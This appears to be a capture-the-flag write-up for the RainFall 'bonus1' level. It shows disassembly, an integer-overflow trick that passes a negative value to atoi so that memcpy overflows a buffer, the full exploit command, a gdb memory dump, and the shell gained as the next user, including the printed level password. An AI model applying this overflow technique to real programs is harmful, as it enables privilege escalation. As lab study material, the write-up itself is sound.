@@ -1,0 +1,44 @@
+The program take av[1] through atoi() and it must be under number 9 to continue the execution, 
+
+   0x08048435 <+17>:	mov    DWORD PTR [esp],eax
+   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
+   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
+   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
+
+then copy av[2] to a buffer using memcpy with len of atoi(av[1]) << 2 multiplied by 2 to the power of 2
+
+then
+0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
+….
+0x08048499 <+117>:	call   0x8048350 <execl@plt>
+If somehow atoi(av[1]) == “WOLF” the program will execute shell.
+I will exploit atoi, and fill the buffer until overwriting the atoi returned value with wolf.
+
+esp address : eip+0x3c = 0xbffff6ac
+av[1] address : 0xbffff684
+
+Starting program: /home/user/bonus1/bonus1 -2147483637 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ`python -c "print('\x46\x4c\x4f\x57')"`
+
+break at :
+
+=> 0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
+
+(gdb) info register esp
+esp            0xbffff670	0xbffff670
+
+(gdb) x/16wx 0xbffff670
+0xbffff670:	0xbffff684	0xbffff8af	0x0000002c	0x080482fd
+0xbffff680:	0xb7fd13e4	0x41414141	0x42424242	0x43434343
+0xbffff690:	0x44444444	0x45454545	0x46464646	0x47474747
+0xbffff6a0:	0x48484848	0x49494949	0x4a4a4a4a	0x574f4c46
+
+bonus1@RainFall:~$ ./bonus1 -2147483637 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ`python -c "print('\x46\x4c\x4f\x57')"`
+$ ls
+ls: cannot open directory .: Permission denied
+$ whoami
+bonus2
+$ pwd
+/home/user/bonus1
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
